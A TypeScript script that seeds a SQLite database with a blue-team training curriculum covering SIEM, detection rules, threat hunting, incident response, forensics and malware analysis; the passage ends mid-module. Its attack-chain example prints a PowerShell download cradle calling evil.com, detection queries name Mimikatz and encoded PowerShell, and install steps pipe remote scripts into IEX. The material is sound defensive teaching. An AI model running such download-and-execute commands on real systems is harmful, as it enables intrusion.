import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// BLUE TEAM / DEFENSIVE SECURITY
// ============================================================================
const bluePath = insertPath.run(
	'Blue Team & Defensive Security',
	'Master defensive security: SIEM, threat detection, incident response, forensics, and malware analysis. Build detection capabilities and respond to real-world attacks.',
	'sky',
	now
);

// Module 1: SIEM & Log Analysis
const blueM1 = insertModule.run(bluePath.lastInsertRowid, 'SIEM & Log Analysis', 'Set up and master Security Information and Event Management', 0, now);
const blueM1Tasks: [string, string, string][] = [
	['Set up ELK Stack (Elasticsearch, Logstash, Kibana)', 'Deploy a local ELK stack using Docker. Configure Elasticsearch for log storage, Logstash for parsing, and Kibana for visualization.',
`## Overview
The ELK Stack is the foundation for security log analysis and threat detection.

## Docker Compose Setup
\`\`\`yaml
version: '3'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - "9200:9200"
    volumes:
      - es-data:/usr/share/elasticsearch/data

  logstash:
    image: docker.elastic.co/logstash/logstash:8.11.0
    volumes:
      - ./logstash/pipeline:/usr/share/logstash/pipeline
    depends_on:
      - elasticsearch

  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
\`\`\`

## Key Configuration
- **Elasticsearch**: Index templates, ILM policies for log retention
- **Logstash**: Grok patterns for parsing different log formats
- **Kibana**: Index patterns, saved searches, dashboards

## Completion Criteria
- [ ] ELK stack running via Docker Compose
- [ ] Can ingest sample logs via Logstash
- [ ] Kibana shows indexed data
- [ ] Understand index lifecycle management`],

	['Configure Windows Event Log forwarding', 'Set up Windows Event Forwarding (WEF) to centralize logs from Windows endpoints. Focus on Security, System, and PowerShell logs.',
`## Windows Event Forwarding Architecture
Collector (your SIEM) pulls events from source computers using WinRM.

## Setup Steps
1. **Enable WinRM on sources**: \`winrm quickconfig\`
2. **Configure collector**: \`wecutil qc\`
3. **Create subscription** via Event Viewer or XML

## Critical Event IDs to Collect
| Event ID | Source | Description |
|----------|--------|-------------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4688 | Security | Process creation |
| 4698 | Security | Scheduled task created |
| 7045 | System | Service installed |
| 4104 | PowerShell | Script block logging |

## Subscription XML Example
\`\`\`xml
<Query Id="0">
  <Select Path="Security">
    *[System[(EventID=4624 or EventID=4625 or EventID=4688)]]
  </Select>
  <Select Path="Microsoft-Windows-PowerShell/Operational">
    *[System[(EventID=4104)]]
  </Select>
</Query>
\`\`\`

## Completion Criteria
- [ ] WinRM enabled on test endpoints
- [ ] Subscription collecting Security events
- [ ] PowerShell script block logging enabled and collected
- [ ] Events visible in ELK`],

	['Build detection rules for common attacks', 'Create Kibana alerts for: failed login brute force (4625), new service installation (7045), PowerShell suspicious commands (4104), and process creation (4688).',
`## Detection Rule Framework
Each rule needs: trigger condition, threshold, time window, and response action.

## Rule 1: Brute Force Detection
\`\`\`json
{
  "query": "event.code:4625",
  "threshold": 10,
  "time_window": "5m",
  "group_by": "source.ip",
  "alert": "Potential brute force from {source.ip}"
}
\`\`\`

## Rule 2: Suspicious Service Installation
\`\`\`json
{
  "query": "event.code:7045 AND NOT service.name:(\"TrustedInstaller\" OR \"Windows Update\")",
  "alert": "New service installed: {service.name}"
}
\`\`\`

## Rule 3: Suspicious PowerShell
\`\`\`
event.code:4104 AND (
  powershell.scriptblock.text:*Invoke-Mimikatz* OR
  powershell.scriptblock.text:*-EncodedCommand* OR
  powershell.scriptblock.text:*DownloadString*
)
\`\`\`

## Rule 4: Suspicious Process Creation
\`\`\`
event.code:4688 AND (
  process.parent.name:winword.exe OR
  process.parent.name:excel.exe
) AND process.name:(cmd.exe OR powershell.exe)
\`\`\`

## Completion Criteria
- [ ] All 4 rules created in Kibana
- [ ] Tested with simulated attacks
- [ ] Alerts trigger correctly
- [ ] False positive tuning documented`],

	['Ingest and analyze Sysmon logs', 'Install Sysmon with a detection-focused config (SwiftOnSecurity or Olaf). Parse process creation, network connections, and file creation events.',
`## Sysmon Overview
System Monitor logs detailed system activity for threat detection.

## Installation
\`\`\`powershell
# Download Sysmon from Sysinternals
sysmon64.exe -accepteula -i sysmonconfig.xml
\`\`\`

## Key Event Types
| Event ID | Type | Detection Use |
|----------|------|---------------|
| 1 | Process Create | Malware execution, LOLBins |
| 3 | Network Connect | C2 beaconing, lateral movement |
| 7 | Image Load | DLL injection, reflective loading |
| 10 | Process Access | Credential dumping (LSASS) |
| 11 | File Create | Malware drops, staging |
| 22 | DNS Query | C2 domains, DNS tunneling |

## Recommended Config
Use SwiftOnSecurity config as baseline:
\`\`\`
https://github.com/SwiftOnSecurity/sysmon-config
\`\`\`

## Logstash Parser
\`\`\`ruby
filter {
  if [winlog][channel] == "Microsoft-Windows-Sysmon/Operational" {
    mutate { add_field => { "log_type" => "sysmon" } }
  }
}
\`\`\`

## Completion Criteria
- [ ] Sysmon installed with SwiftOnSecurity config
- [ ] Logs flowing to ELK
- [ ] Dashboard showing process trees
- [ ] Network connection visibility working`],

	['Create a threat hunting dashboard', 'Build a Kibana dashboard showing: top processes, network connections by destination, rare parent-child relationships, and unsigned binaries.',
`## Dashboard Components

### Panel 1: Top Processes
Visualization: Data table
\`\`\`
Aggregation: Terms on process.name
Size: 20
\`\`\`

### Panel 2: Network Destinations
Visualization: Pie chart
\`\`\`
Aggregation: Terms on destination.ip
Filter: NOT destination.ip:10.* AND NOT destination.ip:192.168.*
\`\`\`

### Panel 3: Rare Parent-Child
Query for unusual relationships:
\`\`\`
process.parent.name:explorer.exe AND
NOT process.name:(chrome.exe OR firefox.exe OR code.exe)
\`\`\`

### Panel 4: Unsigned Binaries
\`\`\`
sysmon.event_id:1 AND process.code_signature.exists:false
\`\`\`

### Panel 5: Timeline
Visualization: Line chart showing events over time

## Hunting Queries
\`\`\`
# Encoded PowerShell
powershell.exe AND command_line:*-enc*

# LSASS access
sysmon.event_id:10 AND target.process.name:lsass.exe

# Scheduled task creation
sysmon.event_id:1 AND process.name:schtasks.exe
\`\`\`

## Completion Criteria
- [ ] Dashboard with all 5 panels
- [ ] Time range selector working
- [ ] Drill-down to raw events
- [ ] Saved hunting queries`],

	['Practice with BOTS dataset', 'Download Splunk Boss of the SOC dataset and import into ELK. Practice investigating a realistic attack scenario including lateral movement and data exfiltration.',
`## BOTS Dataset
Boss of the SOC is a blue team CTF dataset with realistic attack data.

## Download
\`\`\`bash
# BOTS v1 dataset (2017)
wget https://github.com/splunk/botsv1/releases/download/v1/botsv1_data_set.tgz
\`\`\`

## Import to Elasticsearch
\`\`\`python
import json
from elasticsearch import Elasticsearch

es = Elasticsearch(['localhost:9200'])
with open('botsv1.json') as f:
    for line in f:
        event = json.loads(line)
        es.index(index='botsv1', body=event)
\`\`\`

## Investigation Scenario
The APT attack includes:
1. **Initial Access**: Phishing email with malicious attachment
2. **Execution**: Macro executes PowerShell
3. **Persistence**: Scheduled task created
4. **Lateral Movement**: Pass-the-hash to other systems
5. **Exfiltration**: Data sent to external server

## Key Questions
- What IP addresses were involved in the attack?
- What user accounts were compromised?
- What data was exfiltrated?
- What persistence mechanisms were used?

## Completion Criteria
- [ ] Dataset imported successfully
- [ ] Identified initial compromise vector
- [ ] Mapped lateral movement path
- [ ] Found exfiltration evidence
- [ ] Created timeline of attack`],
];
blueM1Tasks.forEach((t, i) => insertTask.run(blueM1.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 2: Threat Detection & Hunting
const blueM2 = insertModule.run(bluePath.lastInsertRowid, 'Threat Detection & Hunting', 'Proactive threat hunting and detection engineering', 1, now);
const blueM2Tasks: [string, string, string][] = [
	['Learn the MITRE ATT&CK framework', 'Study the ATT&CK matrix focusing on Initial Access, Execution, Persistence, and Lateral Movement. Map your detection capabilities to ATT&CK techniques.',
`## MITRE ATT&CK Overview
ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) documents real-world adversary behavior.

## Key Tactics to Focus On
| Tactic | Description | Example Techniques |
|--------|-------------|-------------------|
| Initial Access | How attackers get in | Phishing, Exploit Public App |
| Execution | Running malicious code | PowerShell, WMI, Scheduled Task |
| Persistence | Maintaining access | Registry Run Keys, Services |
| Privilege Escalation | Getting higher access | Token Impersonation, UAC Bypass |
| Lateral Movement | Moving through network | Pass-the-Hash, RDP, SMB |

## Detection Mapping Exercise
For each technique, document:
1. **Data sources needed** (process logs, network, etc.)
2. **Detection logic** (what patterns to look for)
3. **Current coverage** (do you detect this?)

## Example Mapping
\`\`\`
T1059.001 - PowerShell
Data Sources: Script Block Logging (4104), Process Creation (4688)
Detection: -EncodedCommand, DownloadString, Invoke-Expression
Coverage: ✓ Detected via Sysmon + ELK rule
\`\`\`

## Resources
- https://attack.mitre.org
- ATT&CK Navigator for visualization

## Completion Criteria
- [ ] Studied all tactics in the matrix
- [ ] Mapped 10+ techniques to your detections
- [ ] Identified 5+ coverage gaps
- [ ] Created improvement roadmap`],

	['Write Sigma rules for detection', 'Learn Sigma rule syntax and write rules for: mimikatz execution, DCSync, Kerberoasting, and scheduled task persistence.',
`## Sigma Overview
Sigma is a generic signature format for SIEM systems. Write once, convert to any platform.

## Rule Structure
\`\`\`yaml
title: Mimikatz Execution
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - Image|endswith: '\\mimikatz.exe'
        - CommandLine|contains:
            - 'sekurlsa::'
            - 'lsadump::'
    condition: selection
level: critical
\`\`\`

## Rule 1: DCSync Detection
\`\`\`yaml
title: DCSync Attack
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        ObjectType: 'DS-Replication-Get-Changes'
    filter:
        SubjectUserName|endswith: '$'  # Exclude DCs
    condition: selection and not filter
\`\`\`

## Rule 2: Kerberoasting
\`\`\`yaml
title: Kerberoasting
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'  # RC4
        ServiceName|endswith: '$': false
    condition: selection
\`\`\`

## Converting Rules
\`\`\`bash
# Install sigmac
pip install sigma-cli

# Convert to Elasticsearch
sigma convert -t elasticsearch rule.yml
\`\`\`

## Completion Criteria
- [ ] Understand Sigma syntax
- [ ] Written 4 detection rules
- [ ] Converted to your SIEM format
- [ ] Rules tested and working`],

	['Implement YARA rules for file scanning', 'Write YARA rules to detect malware families. Start with simple string matching, progress to PE structure analysis.',
`## YARA Overview
YARA identifies and classifies malware based on patterns.

## Basic Rule Structure
\`\`\`yara
rule Emotet_Loader {
    meta:
        description = "Detects Emotet loader"
        author = "Your Name"
        date = "2024-01-01"

    strings:
        $str1 = "RunDLL32" nocase
        $str2 = {E8 ?? ?? ?? ?? 83 C4 04}  // Hex pattern
        $pdb = "emotet" nocase

    condition:
        uint16(0) == 0x5A4D and  // MZ header
        filesize < 500KB and
        2 of ($str*)
}
\`\`\`

## PE Structure Checks
\`\`\`yara
import "pe"

rule Suspicious_PE {
    condition:
        pe.number_of_sections > 7 and
        pe.entropy > 7.5 and  // Packed/encrypted
        pe.imports("kernel32.dll", "VirtualAlloc") and
        pe.imports("kernel32.dll", "CreateRemoteThread")
}
\`\`\`

## Testing Rules
\`\`\`bash
# Scan a file
yara rules.yar suspicious.exe

# Scan directory
yara -r rules.yar /malware/samples/
\`\`\`

## Integration
- VirusTotal: Upload rules for scanning
- YARA-X: Faster Rust implementation
- ClamAV: Convert YARA to ClamAV sigs

## Completion Criteria
- [ ] Written string-based rule
- [ ] Written PE structure rule
- [ ] Tested against malware samples
- [ ] Integrated into analysis workflow`],

	['Build a threat hunting hypothesis workflow', 'Create a structured approach: hypothesis → data sources → analysis → findings. Document 5 hunts.',
`## Threat Hunting Framework

### The Hunting Loop
1. **Hypothesis**: "Attackers may be using encoded PowerShell for C2"
2. **Data Sources**: PowerShell Script Block logs (4104)
3. **Analysis**: Query for -EncodedCommand, base64 patterns
4. **Findings**: Document hits, false positives, gaps
5. **Improve**: Tune detection, add new rules

## Hunt 1: Unusual PowerShell
\`\`\`
Hypothesis: Attackers use encoded commands to evade detection
Data: Event ID 4104
Query: CommandLine contains "-enc" OR base64 pattern
Expected FP: Some admin scripts
\`\`\`

## Hunt 2: Lateral Movement
\`\`\`
Hypothesis: Pass-the-hash leaves network logon patterns
Data: Event ID 4624 (Type 3), SMB logs
Query: Logon Type 3 with NTLM, unusual source IPs
Expected FP: Service accounts
\`\`\`

## Hunt 3: Persistence
\`\`\`
Hypothesis: Attackers create scheduled tasks for persistence
Data: Event ID 4698, Sysmon 1
Query: schtasks.exe or Task Scheduler events
Expected FP: Software updates
\`\`\`

## Hunt 4: Data Exfiltration
\`\`\`
Hypothesis: Large outbound transfers indicate exfil
Data: Network flow logs, proxy logs
Query: Outbound > 100MB to non-business destinations
Expected FP: Cloud backups
\`\`\`

## Hunt 5: Credential Access
\`\`\`
Hypothesis: LSASS access indicates credential theft
Data: Sysmon Event ID 10
Query: TargetImage contains lsass.exe
Expected FP: AV, security tools
\`\`\`

## Completion Criteria
- [ ] Documented 5 hunt hypotheses
- [ ] Executed each hunt
- [ ] Recorded findings
- [ ] Created follow-up detection rules`],

	['Analyze network traffic with Zeek', 'Deploy Zeek to capture network metadata. Analyze conn.log, dns.log, http.log, and ssl.log. Build detections for beaconing and DNS tunneling.',
`## Zeek Overview
Zeek (formerly Bro) generates detailed network metadata logs.

## Installation
\`\`\`bash
# Ubuntu
sudo apt install zeek

# Start on interface
sudo zeek -i eth0 local.zeek
\`\`\`

## Key Log Files
| Log | Content | Detection Use |
|-----|---------|---------------|
| conn.log | All connections | Beaconing, port scans |
| dns.log | DNS queries | Tunneling, DGA domains |
| http.log | HTTP requests | Malware downloads, C2 |
| ssl.log | TLS metadata | Suspicious certificates |
| files.log | File transfers | Malware delivery |

## Beaconing Detection
\`\`\`python
# Look for regular intervals
from collections import defaultdict
import statistics

connections = defaultdict(list)
for conn in conn_log:
    connections[conn.dest_ip].append(conn.timestamp)

for ip, times in connections.items():
    intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
    if len(intervals) > 10:
        std_dev = statistics.stdev(intervals)
        if std_dev < 5:  # Very regular
            print(f"Potential beacon: {ip}")
\`\`\`

## DNS Tunneling Detection
\`\`\`
# High entropy subdomains
# Long query names
# High query volume to single domain
\`\`\`

## Completion Criteria
- [ ] Zeek deployed and logging
- [ ] Logs ingested into SIEM
- [ ] Beaconing detection implemented
- [ ] DNS tunneling detection implemented`],

	['Practice with Atomic Red Team', 'Run Atomic Red Team tests in a lab. Verify your detections trigger. Document gaps and improve detection coverage.',
`## Atomic Red Team Overview
Small, focused tests mapped to MITRE ATT&CK techniques.

## Installation
\`\`\`powershell
# Install Invoke-AtomicRedTeam
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
\`\`\`

## Running Tests
\`\`\`powershell
# List available tests for a technique
Invoke-AtomicTest T1059.001 -ShowDetails

# Run specific test
Invoke-AtomicTest T1059.001 -TestNumbers 1

# Run and check prerequisites
Invoke-AtomicTest T1059.001 -CheckPrereqs
\`\`\`

## Key Techniques to Test
| Technique | Name | Test |
|-----------|------|------|
| T1059.001 | PowerShell | Encoded commands |
| T1003.001 | LSASS Dump | Mimikatz, comsvcs |
| T1053.005 | Scheduled Task | Persistence |
| T1021.002 | SMB/Admin Shares | Lateral movement |
| T1547.001 | Registry Run Keys | Persistence |

## Detection Validation
\`\`\`
1. Run atomic test
2. Check SIEM for alert
3. If no alert: gap identified
4. Create/tune detection rule
5. Re-test to verify
\`\`\`

## Documentation Template
\`\`\`markdown
## T1059.001 - PowerShell
- Test: Invoke-AtomicTest T1059.001 -TestNumbers 1
- Expected: Alert on encoded PowerShell
- Result: ✓ Alert triggered / ✗ No alert
- Action: [If gap] Create Sigma rule
\`\`\`

## Completion Criteria
- [ ] Atomic Red Team installed
- [ ] Ran 10+ techniques
- [ ] Documented detection coverage
- [ ] Created rules for gaps found`],
];
blueM2Tasks.forEach((t, i) => insertTask.run(blueM2.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 3: Incident Response
const blueM3 = insertModule.run(bluePath.lastInsertRowid, 'Incident Response', 'Structured incident handling and containment', 2, now);
const blueM3Tasks: [string, string, string][] = [
	['Create an IR playbook template', 'Build playbooks covering: phishing, malware infection, compromised account, ransomware, and data breach.',
`## Playbook Structure
Each playbook follows: Detection → Containment → Eradication → Recovery → Lessons Learned

## Phishing Playbook
\`\`\`markdown
### Detection
- User report or email gateway alert
- Check for similar emails to other users

### Containment
- Block sender domain/IP at email gateway
- Search for delivered copies, delete from mailboxes
- If link clicked: isolate endpoint

### Eradication
- Reset credentials if entered on phishing site
- Scan endpoint for malware if attachment opened
- Revoke OAuth tokens if granted

### Recovery
- Monitor for suspicious activity on affected accounts
- Re-enable normal access after verification
\`\`\`

## Ransomware Playbook
\`\`\`markdown
### Detection
- Ransom note files, encrypted files (.encrypted, .locked)
- High file modification activity

### Containment (URGENT)
- Isolate affected systems (network disconnect)
- Disable shares to prevent spread
- Preserve encrypted files (may need for decryption)

### Eradication
- Identify ransomware variant (ID Ransomware)
- Wipe and reimage affected systems
- Check for persistence on other systems

### Recovery
- Restore from backups (verify clean)
- Validate decryption if key obtained
- Gradual network reconnection
\`\`\`

## Completion Criteria
- [ ] Created 5 playbooks
- [ ] Each has all 4 phases
- [ ] Contact lists included
- [ ] Playbooks reviewed by team`],

	['Master memory forensics with Volatility', 'Use Volatility 3 to analyze memory dumps. Practice: listing processes, network connections, injected code, and extracting malware.',
`## Volatility 3 Setup
\`\`\`bash
git clone https://github.com/volatilityfoundation/volatility3
cd volatility3
pip install -r requirements.txt
\`\`\`

## Essential Commands
\`\`\`bash
# List processes
vol -f memory.dmp windows.pslist
vol -f memory.dmp windows.pstree  # Tree view

# Network connections
vol -f memory.dmp windows.netstat

# Injected code
vol -f memory.dmp windows.malfind

# DLL list
vol -f memory.dmp windows.dlllist --pid 1234

# Command line arguments
vol -f memory.dmp windows.cmdline
\`\`\`

## Hunting for Malware
\`\`\`bash
# Suspicious processes
vol -f memory.dmp windows.pslist | grep -E "cmd|powershell|wscript"

# Hidden processes
vol -f memory.dmp windows.psscan  # Finds terminated/hidden

# Process hollowing
vol -f memory.dmp windows.malfind --pid 1234

# Extract suspicious executable
vol -f memory.dmp windows.dumpfiles --pid 1234
\`\`\`

## Memory Acquisition
\`\`\`powershell
# DumpIt (Windows)
DumpIt.exe /OUTPUT memory.dmp

# WinPmem
winpmem_mini_x64.exe memory.raw
\`\`\`

## Practice Resources
- MemLabs challenges
- Volatility wiki samples

## Completion Criteria
- [ ] Acquired memory from test VM
- [ ] Listed processes and found anomalies
- [ ] Used malfind to detect injection
- [ ] Extracted malicious files from memory`],

	['Perform disk forensics with Autopsy', 'Use Autopsy to analyze disk images. Practice timeline analysis, file recovery, browser artifact analysis, and registry examination.',
`## Autopsy Setup
Download from: https://www.autopsy.com/download/

## Creating a Case
1. New Case → Enter case name and number
2. Add Data Source → Disk Image
3. Configure ingest modules (run all for full analysis)

## Key Analysis Areas

### Timeline Analysis
- View → Timeline
- Filter by date range of incident
- Look for file creation, modification, access patterns

### File Recovery
- Deleted Files section shows recoverable files
- Carved files found by file signatures
- Export files for further analysis

### Browser Artifacts
- Web History, Downloads, Bookmarks
- Search for suspicious domains
- Check downloaded file paths

### Registry Analysis
- NTUSER.DAT: User activity, Run keys
- SAM: User accounts
- SYSTEM: Services, network config
- SOFTWARE: Installed programs

## Useful Locations
\`\`\`
C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent
C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Windows\\Explorer
C:\\Windows\\Prefetch
C:\\$MFT (Master File Table)
\`\`\`

## Completion Criteria
- [ ] Created case with disk image
- [ ] Built timeline of events
- [ ] Recovered deleted files
- [ ] Analyzed browser history
- [ ] Examined registry keys`],

	['Collect and preserve evidence properly', 'Learn chain of custody, proper imaging with FTK Imager or dd, hash verification, and documentation requirements.',
`## Chain of Custody
Document every person who handles evidence:
\`\`\`
Evidence ID: 2024-001
Description: Dell Laptop HD, 500GB
Collected by: John Smith
Date/Time: 2024-01-15 14:30 UTC
Location: Office 302
Hash (SHA256): abc123...
\`\`\`

## Disk Imaging with FTK Imager
1. Connect write blocker to suspect drive
2. FTK Imager → Create Disk Image
3. Select source (Physical Drive)
4. Choose format (E01 recommended)
5. Verify image hash matches source

## Disk Imaging with dd
\`\`\`bash
# Create image
dd if=/dev/sda of=evidence.dd bs=4M status=progress

# Calculate hash
sha256sum /dev/sda > source_hash.txt
sha256sum evidence.dd > image_hash.txt

# Compare hashes
diff source_hash.txt image_hash.txt
\`\`\`

## Write Blockers
- Hardware: Tableau, CRU
- Software: Not recommended for legal cases

## Documentation Checklist
- [ ] Photos of evidence before collection
- [ ] Serial numbers recorded
- [ ] Hash values calculated and recorded
- [ ] Chain of custody form started
- [ ] Secure storage location documented

## Completion Criteria
- [ ] Created forensic image
- [ ] Verified hash integrity
- [ ] Documented chain of custody
- [ ] Understand write blocking importance`],

	['Analyze a complete attack chain', 'Work through a full incident: initial access → execution → persistence → lateral movement → objective. Document IOCs and TTPs.',
`## Sample Attack Chain Analysis

### Phase 1: Initial Access
\`\`\`
Evidence: Phishing email with macro-enabled document
Timestamp: 2024-01-15 09:23:00
IOC: sender@malicious-domain.com
     doc_hash: sha256:abc123...
\`\`\`

### Phase 2: Execution
\`\`\`
Evidence: Word spawned PowerShell (Sysmon Event 1)
Timestamp: 2024-01-15 09:24:15
Command: powershell -enc <base64>
Decoded: IEX(New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')
\`\`\`

### Phase 3: Persistence
\`\`\`
Evidence: Scheduled task created (Event 4698)
Timestamp: 2024-01-15 09:25:00
Task: "Windows Update Check"
Action: powershell.exe -f C:\\Users\\Public\\update.ps1
\`\`\`

### Phase 4: Lateral Movement
\`\`\`
Evidence: Type 3 logon to file server (Event 4624)
Timestamp: 2024-01-15 10:45:00
Source: WORKSTATION01
Target: FILESERVER01
Method: Pass-the-hash (NTLM)
\`\`\`

### Phase 5: Objective (Exfiltration)
\`\`\`
Evidence: Large outbound transfer (proxy logs)
Timestamp: 2024-01-15 14:00:00
Destination: 185.x.x.x (known bad)
Data: 2.5GB to cloud storage
\`\`\`

## IOC Summary
\`\`\`
Domains: malicious-domain.com, evil.com
IPs: 185.x.x.x, 192.x.x.x
Hashes: sha256:abc123..., sha256:def456...
Files: update.ps1, stage2.ps1
\`\`\`

## Completion Criteria
- [ ] Identified all attack phases
- [ ] Created detailed timeline
- [ ] Extracted all IOCs
- [ ] Mapped to MITRE ATT&CK`],

	['Write an incident report', 'Create a comprehensive report including: executive summary, timeline, technical details, IOCs, root cause, and recommendations.',
`## Report Structure

### 1. Executive Summary (1 page)
\`\`\`
On January 15, 2024, a phishing attack compromised one workstation,
leading to lateral movement and exfiltration of 2.5GB of data.
The attack was detected within 6 hours. Immediate actions taken
include isolation, credential reset, and malware removal.
Estimated impact: [data types exposed]. No customer PII confirmed.
\`\`\`

### 2. Timeline
| Time (UTC) | Event | Evidence |
|------------|-------|----------|
| 09:23 | Phishing email received | Email logs |
| 09:24 | Macro executed, PowerShell launched | Sysmon |
| 09:25 | Persistence established | Event 4698 |
| 10:45 | Lateral movement to file server | Event 4624 |
| 14:00 | Data exfiltration detected | Proxy logs |
| 15:30 | Incident declared, containment started | SOC ticket |

### 3. Technical Details
- Initial vector: Macro-enabled document
- Malware: Custom PowerShell downloader
- C2: http://evil.com (185.x.x.x)
- Affected systems: WORKSTATION01, FILESERVER01

### 4. Indicators of Compromise
\`\`\`
[IP] 185.x.x.x
[Domain] evil.com
[Hash] sha256:abc123...
[File] C:\\Users\\Public\\update.ps1
\`\`\`

### 5. Root Cause Analysis
- Macro execution enabled by default
- Lack of email attachment sandboxing
- Excessive file share permissions

### 6. Recommendations
1. Disable macros by default (GPO)
2. Implement email sandboxing
3. Review file share permissions
4. Deploy EDR solution

## Completion Criteria
- [ ] Report follows template
- [ ] Non-technical exec summary
- [ ] Complete timeline
- [ ] Actionable recommendations`],
];
blueM3Tasks.forEach((t, i) => insertTask.run(blueM3.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 4: Malware Analysis
const blueM4 = insertModule.run(bluePath.lastInsertRowid, 'Malware Analysis', 'Static and dynamic malware analysis techniques', 3, now);
const blueM4Tasks: [string, string, string][] = [
	['Set up a malware analysis lab', 'Build an isolated VM environment with FlareVM or REMnux. Configure network isolation, snapshots, and safe file sharing.',
`## Lab Architecture
\`\`\`
[Host Machine]
     |
[NAT/Internal Network] ← No internet access
     |
┌────┴────┐
│ FlareVM │ ← Windows analysis
└─────────┘
     |
┌─────────┐
│ REMnux  │ ← Linux analysis + fake services
└─────────┘
\`\`\`

## FlareVM Setup (Windows)
\`\`\`powershell
# In clean Windows 10 VM
Set-ExecutionPolicy Bypass -Scope Process -Force
iex ((New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1'
))
\`\`\`

## REMnux Setup
\`\`\`bash
# Download OVA or install on Ubuntu
wget https://remnux.org/remnux-cli
sudo mv remnux-cli /usr/local/bin/remnux
sudo remnux install
\`\`\`

## Network Configuration
- **Isolated network**: VMs can talk to each other only
- **INetSim on REMnux**: Fake DNS, HTTP, HTTPS services
- **Wireshark**: Capture all traffic

## Safety Rules
1. Never connect analysis VM to production network
2. Take snapshot before running malware
3. Disable shared folders during execution
4. Use separate physical machine if possible

## Completion Criteria
- [ ] FlareVM installed with tools
- [ ] REMnux configured with INetSim
- [ ] Network isolation verified
- [ ] Snapshot workflow tested`],

	['Perform static analysis with PE tools', 'Use PE-bear, pestudio, and CFF Explorer to analyze Windows executables. Identify imports, exports, sections, and suspicious indicators.',
`## Static Analysis Workflow
1. **Hashes**: Calculate MD5, SHA256 for identification
2. **Strings**: Extract readable strings
3. **PE Headers**: Analyze structure
4. **Imports**: What APIs does it use?
5. **Sections**: Look for anomalies

## PE-bear Analysis
\`\`\`
1. Load PE file
2. Check imports: VirtualAlloc, WriteProcessMemory = injection
3. Check sections: High entropy = packed/encrypted
4. Look at resources: May contain embedded files
\`\`\`

## Suspicious Indicators
| Indicator | Meaning |
|-----------|---------|
| VirtualAllocEx | Remote memory allocation |
| CreateRemoteThread | Code injection |
| IsDebuggerPresent | Anti-debugging |
| High entropy sections | Packed/encrypted |
| Few imports | Dynamically resolved APIs |

## Strings Analysis
\`\`\`bash
# Extract strings
strings -n 6 malware.exe > strings.txt

# Look for:
# - URLs, IP addresses
# - Registry paths
# - File paths
# - Commands
\`\`\`

## pestudio Quick Checks
- **Indicators**: Red items need attention
- **Imports**: Blacklisted APIs highlighted
- **Resources**: Embedded files
- **Strings**: Filtered suspicious strings

## Completion Criteria
- [ ] Analyzed sample with PE-bear
- [ ] Extracted and reviewed strings
- [ ] Identified suspicious imports
- [ ] Checked section entropy`],

	['Master dynamic analysis with x64dbg', 'Debug malware to understand runtime behavior. Set breakpoints on key APIs. Trace execution and extract IOCs.',
`## x64dbg Setup
- Download from: https://x64dbg.com
- Load malware (paused at entry point)
- Configure symbols for better analysis

## Essential Breakpoints
\`\`\`
bp VirtualAlloc       ; Memory allocation
bp VirtualAllocEx     ; Remote allocation
bp CreateProcessW     ; Process creation
bp WriteProcessMemory ; Process injection
bp CreateRemoteThread ; Thread injection
bp InternetOpenUrlW   ; Network activity
bp RegSetValueExW     ; Registry modification
\`\`\`

## Debugging Workflow
\`\`\`
1. Set breakpoints on suspicious APIs
2. Run (F9) until breakpoint hit
3. Check stack for parameters
4. Step over (F8) to see result
5. Document behavior
6. Continue to next breakpoint
\`\`\`

## Memory Dumping
\`\`\`
1. Break after VirtualAlloc
2. Note allocated address in EAX/RAX
3. After WriteProcessMemory, dump region:
   Right-click address → Follow in Dump
   Right-click dump → Save to file
\`\`\`

## Extracting C2
\`\`\`
1. Break on InternetOpenUrl or WinHttpConnect
2. Check first parameter (URL/hostname)
3. Document all network indicators
\`\`\`

## Anti-Anti-Debugging
- ScyllaHide plugin hides debugger
- Patch IsDebuggerPresent returns

## Completion Criteria
- [ ] Set API breakpoints
- [ ] Traced malware execution
- [ ] Dumped unpacked code from memory
- [ ] Extracted network IOCs`],

	['Analyze a dropper/loader', 'Reverse a multi-stage malware sample. Identify the unpacking routine, decrypt embedded payloads, and extract the final payload.',
`## Multi-Stage Malware Flow
\`\`\`
Stage 1: Dropper/Loader
    ↓ (decrypts)
Stage 2: Shellcode or DLL
    ↓ (downloads or unpacks)
Stage 3: Final Payload (RAT, ransomware, etc.)
\`\`\`

## Identifying the Unpacking Routine
\`\`\`
1. Look for VirtualAlloc → large allocation
2. Followed by decryption loop (XOR, RC4, AES)
3. Then VirtualProtect (make executable)
4. Finally, call/jmp to unpacked code
\`\`\`

## Common Decryption Patterns
\`\`\`asm
; XOR loop
mov ecx, length
mov esi, encrypted_data
xor_loop:
    xor byte [esi], key
    inc esi
    loop xor_loop

; RC4 (look for S-box initialization)
; AES (look for imports or constants)
\`\`\`

## Extracting Payload
\`\`\`
1. Set breakpoint after decryption
2. Dump decrypted region:
   - In x64dbg: Memory Map → Right-click → Dump to file
3. Analyze Stage 2 separately
